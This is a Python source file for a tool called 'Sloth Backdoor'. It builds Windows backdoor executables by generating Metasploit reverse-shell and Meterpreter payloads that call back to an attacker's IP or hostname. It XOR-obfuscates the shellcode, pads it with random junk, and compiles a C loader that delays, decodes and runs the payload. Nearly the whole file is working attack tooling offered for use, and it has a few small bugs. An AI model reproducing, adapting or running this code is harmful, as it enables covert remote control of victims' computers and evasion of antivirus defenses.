#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import commands
import subprocess
import random 
from struct import *

# Collors
Reset="\033[0m"         # Text Reset
# Regular Colors
Black="\033[0;30m"        # Black
Red="\033[0;31m"          # Red
Green="\033[0;32m"        # Green
Yellow="\033[0;33m"       # Yellow
Blue="\033[0;34m"         # Blue
Purple="\033[0;35m"       # Purple
Cyan="\033[0;36m"         # Cyan
White="\033[0;37m"        # White

	# Bold
BBlack="\033[1;30m"       # Black
BRed="\033[1;31m"         # Red
BGreen="\033[1;32m"       # Green
BYellow="\033[1;33m"      # Yellow
BBlue="\033[1;34m"        # Blue
BPurple="\033[1;35m"      # Purple
BCyan="\033[1;36m"        # Cyan
BWhite="\033[1;37m"       # White

def banner():
        '''
        '''
        print '''
 [++]---------------------------------------------------[++]
 [++]                                           	[++]
 [++] 	               Sloth Backdoor   		[++]
 [++]                    Version: 1.0                  	[++] 
 [++]                                           	[++] 
 [++] 	Modified by: Moisés Oliver (msOliver) 		[++]
 [++] 	Channel: https://goo.gl/dnglar		 	[++]
 [++] Homepage: http://mstutoriall.blogspot.com.br/	[++]
 [++]                                           	[++] 
 [++]---------------------------------------------------[++]  
        '''
        
# Check Module Glob
def checkGlob():
        '''        
        '''
        try:
                import glob
                print (BGreen+" [+] "+BBlue+"glob"+BWhite+" is already installed -> "+Green+"Found!"+Reset)
        except ImportError:
                print (BRed+" [-] "+BRed+"glob"+BWhite+" is not installed - > "+Red+"Not found!"+Reset)
                
# Check Module ipgetter
def checkIpgetter():
        '''        
        '''
        try:
                import ipgetter # easy_install ipgetter # pip install ipgetter
                print (BGreen+" [+] "+BBlue+"ipgetter"+BWhite+" is already installed ->"+Green+" Found!"+Reset)
        except ImportError:
                print (BRed+" [-] "+BRed+"ipgetter"+BWhite+" is not installed - >"+Red+" Not found!"+Reset)
                
# Check Module Fcntl
def checkFcntl():
        '''        
        '''
        try:
                import fcntl
                print (BGreen+" [+] "+BBlue+"fcntl"+BWhite+" is already installed ->"+Green+" Found!"+Reset)
        except ImportError:
                print (BRed+" [-] "+BRed+"fcntl"+BWhite+" is not installed - >"+Red+" Not found!"+Reset) 
                 
# Check Module Fcntl
def checkStruct():
        '''
        '''
        try:
                import struct
                print (BGreen+" [+] "+BBlue+"struct"+BWhite+" is already installed ->"+Green+" Found!"+Reset)
        except ImportError:
                print (BRed+" [-] "+BRed+"struct"+BWhite+" is not installed - >"+Red+" Not found!"+Reset) 

# Check Module i586-mingw32msvc-gcc
def checkMingw():
        '''
        '''
        if os.path.isfile('/usr/bin/i586-mingw32msvc-gcc'):
                print (BGreen+" [+] "+BBlue+"mingw32"+BWhite+" is already installed ->"+Green+" Found!"+Reset)
        else:
                print (BRed+" [-] "+BRed+"mingw32"+BWhite+" is not installed - >"+Red+" Not found!"+Reset) 

# Call all functions check modules          
def statusModules():
        '''
        '''
        print " ["+BYellow+" Checking backend applications! "+Reset+"]"
        checkGlob()
        checkIpgetter()
        checkFcntl()
        checkStruct()
        checkMingw()

def startHandler():
        '''
        '''
        print '''      
 1 ) Starting the msfconsole listener
 0 ) Exit      
        '''
        opStart = raw_input(BGreen +" [?]" + BBlue + " Enter with Option (1-0): " + Reset).strip() 
        if opStart == "1":
                print opStart
        else:
                print "\n\n Shutdown requested...Goodbye..."
                exit(0)       
        
def genStructure():
        '''
        '''
        # Source code structure template
        code = """
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <time.h>

int main(){
char junkA []= %s;
unsigned char payload[] = %s;
char junkB []= %s;
unsigned char key = %s;
unsigned int PAYLOAD_LENGTH = %s;
int i;
unsigned char* exec = (unsigned char*)malloc(PAYLOAD_LENGTH/2);
unsigned char* unpack = (unsigned char*)malloc(PAYLOAD_LENGTH/2);
int z, y;
int devide;
int x = 0;
time_t start_time, cur_time;

time(&start_time);
do
{
time(&cur_time);
}
while((cur_time - start_time) < 2);

for(i=0; i<PAYLOAD_LENGTH; i++)
{
devide = %s
if(devide == 0)
{
unpack[x]=payload[i];
x++;
}
}

for(i=0; i<PAYLOAD_LENGTH/2; i++)
{
    for(z=0;z<5000;z++)
    {
	for(y=0;y<500;y++)
	{
    		exec[i]=unpack[i]^key;
    	}
    }
}

((void (*)())exec)();

return 0;
}
"""
        file = open("structure.c","w") 
        file.write(code) 
        file.close()       
           
def deleteOld():  
        import glob          
        delFile = 'backdored.exe'
        localisfile = glob.glob(delFile)
        if os.path.exists(delFile):
	        #print 'existe!'
	        for localisfile in localisfile:
		        os.unlink(localisfile)
        else:
	        pass
	        #print 'nao existe!'
#
def mainPayload():
        '''
        '''
        import time, datetime
        print '''
 1) windows/shell_reverse_tcp
 --------------------------------------
 2) windows/shell/reverse_tcp
 3) windows/shell/reverse_tcp_dns
 --------------------------------------
 4) windows/meterpreter/reverse_tcp"
 5) windows/meterpreter/reverse_tcp_dns"
 --------------------------------------"
 6) windows/meterpreter/reverse_http"
 7) windows/meterpreter/reverse_https"     
        '''
        payload = raw_input(BGreen +" [?]" + BBlue +" Select Payload 1-8: " + Reset).strip()        
        payload_raw = "temp.raw"
        out = "temp.c"     
        
        if op == "1":
                print Green + " [*] Generating shellcode metasploit..." + Reset   
                print Green + " [*] LHost " + Reset , publicIP 
                print Green + " [*] LPort " + Reset , lport , "\n"
                if payload == "1":
                        os.system("msfvenom -p windows/shell_reverse_tcp \
	                LHOST=%s LPORT=%s -f raw  > %s" % (publicIP,lport,payload_raw))           
                elif payload == "2":
                        os.system("msfvenom -p windows/shell/reverse_tcp \
	                LHOST=%s LPORT=%s -f raw  > %s" % (publicIP,lport,payload_raw))
                elif payload == "3":
	                os.system("msfvenom -p windows/shell/reverse_tcp_dns \
	                LHOST=%s LPORT=%s -f raw  > %s" % (publicIP,lport,payload_raw))     	
                elif payload == "4":
	                os.system("msfvenom -p windows/meterpreter/reverse_tcp \
	                LHOST=%s LPORT=%s -f raw  > %s" % (publicIP,lport,payload_raw))
	        elif payload == "5":
                        os.system("msfvenom -p windows/meterpreter/reverse_tcp_dns \
	                LHOST=%s LPORT=%s -f raw  > %s" % (publicIP,lport,payload_raw))
	        elif payload == "6":
	                os.system("msfvenom -p windows/meterpreter/reverse_http \
	                LHOST=%s LPORT=%s -f raw  > %s" % (publicIP,lport,payload_raw))	                
	         
	        elif payload == "7":  
	                os.system("msfvenom -p windows/meterpreter/reverse_https \
	                LHOST=%s LPORT=%s -f raw  > %s" % (publicIP,lport,payload_raw))        
	elif op == "2":
	        print Green + " [*] Generating shellcode metasploit..." + Reset   
                print Green + " [*] LHost " + Reset , localIP 
                print Green + " [*] LPort " + Reset , lport , "\n"
	        if payload == "1":
	                os.system("msfvenom -p windows/shell_reverse_tcp \
	                LHOST=%s LPORT=%s -f raw  > %s" % (localIP,lport,payload_raw))  
	        elif payload == "2":
	                os.system("msfvenom -p windows/shell/reverse_tcp \
	                LHOST=%s LPORT=%s -f raw  > %s" % (localIP,lport,payload_raw))	                
	        elif payload == "3":
	                os.system("msfvenom -p windows/shell/reverse_tcp_dns \
	                LHOST=%s LPORT=%s -f raw  > %s" % (localIP,lport,payload_raw))
	        elif payload == "4":
	                os.system("msfvenom -p windows/meterpreter/reverse_tcp \
	                LHOST=%s LPORT=%s -f raw  > %s" % (localIP,lport,payload_raw))
	        elif payload == "5":
	                os.system("msfvenom -p windows/meterpreter/reverse_tcp_dns \
	                LHOST=%s LPORT=%s -f raw  > %s" % (localIP,lport,payload_raw))
	        elif payload == "6":
	                os.system("msfvenom -p windows/meterpreter/reverse_http \
	                LHOST=%s LPORT=%s -f raw  > %s" % (localIP,lport,payload_raw))
	        elif payload == "7":
	                os.system("msfvenom -p windows/meterpreter/reverse_https \
	                LHOST=%s LPORT=%s -f raw  > %s" % (localIP,lport,payload_raw))
        else:
                print Green + " [*] Generating shellcode metasploit..." + Reset   
                print Green + " [*] LHost " + Reset , hostname 
                print Green + " [*] LPort " + Reset , lport , "\n"
	        if payload == "1":
	                os.system("msfvenom -p windows/shell_reverse_tcp \
	                LHOST=%s LPORT=%s -f raw  > %s" % (hostname,lport,payload_raw))  
	        elif payload == "2":
	                os.system("msfvenom -p windows/shell/reverse_tcp \
	                LHOST=%s LPORT=%s -f raw  > %s" % (hostname,lport,payload_raw))	                
	        elif payload == "3":
	                os.system("msfvenom -p windows/shell/reverse_tcp_dns \
	                LHOST=%s LPORT=%s -f raw  > %s" % (hostname,lport,payload_raw))
	        elif payload == "4":
	                os.system("msfvenom -p windows/meterpreter/reverse_tcp \
	                LHOST=%s LPORT=%s -f raw  > %s" % (hostname,lport,payload_raw))
	        elif payload == "5":
	                os.system("msfvenom -p windows/meterpreter/reverse_tcp_dns \
	                LHOST=%s LPORT=%s -f raw  > %s" % (hostname,lport,payload_raw))
	        elif payload == "6":
	                os.system("msfvenom -p windows/meterpreter/reverse_http \
	                LHOST=%s LPORT=%s -f raw  > %s" % (hostname,lport,payload_raw))
	        elif payload == "7":
	                os.system("msfvenom -p windows/meterpreter/reverse_https \
	                LHOST=%s LPORT=%s -f raw  > %s" % (hostname,lport,payload_raw))                      
        
        print " [*] Removendo antigo backdoors"
        time.sleep(1)
        deleteOld()	                                              
        print BGreen + "\n [*]" + Green +" Generating Code structure"+Reset
        time.sleep(1)
        genStructure()
        structure = "structure.c"
        
        key = random.randint(0,255)
        print Green + " [*] Gerando junk aleatório..." + Reset
        time.sleep(1)
        print Green + " [*] Randomizando o tamanho do arquivo..." + Reset
        time.sleep(1)
        randomSize = random.randint(20480,25600)
        
        junkA = ""
        junkB = "" 

        junkA += "\""
        for i in xrange(1,randomSize):
	        junkA += chr(random.randint(65,90)) 
        junkA +=  "\""

        junkB += "\""
        for i in xrange(0,randomSize):
	        junkB += chr(random.randint(65,90)) 
        junkB +=  "\""
        a = open(payload_raw,"rb")
        b = open(out,"w")

        payload_raw = a.read()
        tempArray = []
        outArray = []
        x = 0

        print BGreen + " [*]" + Green +" Codificando com a chave XOR: ", hex(key) 
        time.sleep(1)
        print BGreen + " [*]" + Green +" Ofuscado shellcode..." + Reset
        time.sleep(1)
        length = int(len(payload_raw)*2)

        for i in xrange(0,length):
	        if i % 2 == 0:
		        tempArray.append(unpack("B",payload_raw[x])[0]^key)
		        x += 1
	        else:
		        randomByte = random.randint(65,90)
		        tempArray.append(randomByte)	
        for i in range(0,len(tempArray)):
	        tempArray[i]="\\x%x"%tempArray[i]
        for i in range(0,len(tempArray),15):
	        outArray.append('\n"'+"".join(tempArray[i:i+15])+"\"")
        outArray = "".join(outArray)

        devide = "i % 2;"
          
        open_structure = open(structure).read()
        code = open_structure % (junkA,outArray,junkB,key,length,devide)
        b.write(code)
        b.flush()

        print BGreen + " [*]" + Green +" Compilando " + Reset
        time.sleep(1)
        os.system("i586-mingw32msvc-gcc -mwindows temp.c")
        print BRed + " [-] " + Red + "Excluindo símbolos de depuração..." + Reset
        time.sleep(1)
        os.system("strip --strip-debug a.exe")
        print Green + " [+] Renomeando Backdoor" + Reset
        time.sleep(1)
        os.system("mv a.exe backdored.exe")
        print BRed + " [-] " + Red + "Limpando temporarios..." + Reset
        time.sleep(1)
        os.system("rm temp.c")
        os.system("rm temp.raw")
        os.system("rm structure.c")
        print BBlue + " [*]" + Blue +" Pronto !" + Reset    
        
        startHandler()
        #mainStartMsf()            
#
def getPublicIp():
        '''
        '''
        import ipgetter
        IP = ipgetter.myip()
        return IP

def get_interface_ip(ifname):
        '''
        '''
        # http://stackoverflow.com/questions/11735821/python-get-localhost-ip
        import fcntl
        import struct
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        return socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', ifname[:15]))[20:24])
                                
def get_lan_ip():
        '''
        '''
        # http://stackoverflow.com/questions/11735821/python-get-localhost-ip
        import socket
        ip = socket.gethostbyname(socket.gethostname())
        if ip.startswith("127.") and os.name != "nt":
                interfaces = [
                        "eth0",
                        "eth1",
                        "eth2",
                        "wlan0",
                        "wlan1",
                        "wifi0",
                        "ath0",
                        "ath1",
                        "ppp0",
                        ]
                for ifname in interfaces:
                        try:
                                ip = get_interface_ip(ifname)
                                break
                        except IOError:
                                pass
        return ip	
            
#        
def ipOptions():
        '''
        '''
        import time, datetime
        global op,lport,publicIP,localIP,hostname
        print '''
        
 1 ) Use Ip External 
 2 ) Use Ip Local
 3 ) Use Hostname        
        '''
        op = raw_input(" Enter with options menu ").strip()
        if op == "1":
                publicIP = getPublicIp()
                print BGreen + "\n " + publicIP + Reset +"\n"
                lport = int(raw_input(" [+] Entre com a porta: "))
                print "\n Please Waiting 1 sec ... "
                time.sleep(1)
                mainPayload()
         
        elif op == "2":
                localIP = get_lan_ip()
                print BGreen + "\n " + localIP + Reset  + "\n"
                lport = int(raw_input(" [+] Entre com a porta: "))
                print "\n Please Waiting 1 sec ... "
                time.sleep(1)
                mainPayload()
                        
        elif op == "3":
                hostname = raw_input(" Enter with Hostname: ")
                lport = int(raw_input(" [+] Entre com a porta: "))
                print "\n Please Waiting 1 sec ... "
                time.sleep(1)
                mainPayload()                
        else:
                ipOptions()            
def main():

        try:
                banner()
                statusModules()
                ipOptions()
	except KeyboardInterrupt:
		print "\n\n Shutdown requested...Goodbye..."
	except Exception:
		traceback.print_exc(file=sys.stdout)
	        sys.exit(0)
	                           
if __name__ == "__main__":
        main() 









                             
